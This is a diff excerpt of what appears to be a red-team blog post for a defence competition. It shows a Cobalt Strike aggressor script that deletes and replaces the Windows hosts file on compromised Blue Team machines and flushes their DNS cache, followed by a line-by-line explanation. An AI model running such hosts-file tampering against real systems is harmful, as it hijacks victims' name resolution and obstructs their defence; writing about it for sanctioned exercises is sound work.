@@ -72,16 +72,16 @@ popup beacon_bottom {
 Blue Teams and Red Teams alike use the internet during the competition, researching how to remediate vulnerabilities, looking up that default credential for the router, the list goes on. The difference is that ideally the Blue Team's hosts are owned in multiple ways, so why not use that to our advantage to slow the research efforts? This script stomps the target(s) host file with a selected file and clears the DNS cache.
 
 ```perl
-		item "Replace Host File" {
-			prompt_file_open("Choose a file to replace the current host file:", "hosts.txt", false, lambda({
-				bcd(@ids,"c:\\windows\\system32\\drivers\\etc");
-				brm(@ids,"hosts");
-				blog(@ids,"Uploading file $1 to c:\\windows\\system32\\drivers\\etc\\hosts");
-				bupload(@ids,$1);
-				bshell(@ids, "ipconfig /flushdns");
-				blog(@ids,"File uploaded and DNS flushed. Done!");
-			}, @ids => $1));
-		}
+item "Replace Host File" {
+	prompt_file_open("Choose a file to replace the current host file:", "hosts.txt", false, lambda({
+		bcd(@ids,"c:\\windows\\system32\\drivers\\etc");
+		brm(@ids,"hosts");
+		blog(@ids,"Uploading file $1 to c:\\windows\\system32\\drivers\\etc\\hosts");
+		bupload(@ids,$1);
+		bshell(@ids, "ipconfig /flushdns");
+		blog(@ids,"File uploaded and DNS flushed. Done!");
+	}, @ids => $1));
+}
 ```
 
 Line 2 prompts the user for a file. Once selected, the file is assigned the `$1` variable and the lambda function is evaluated. The lambda function is used to evaluate the lines within the parenthesis inline, lines 4 - 9 in this case. Those lines handle the removal of the current host file, upload of the selected file, and flushing of the hosts' DNS. 
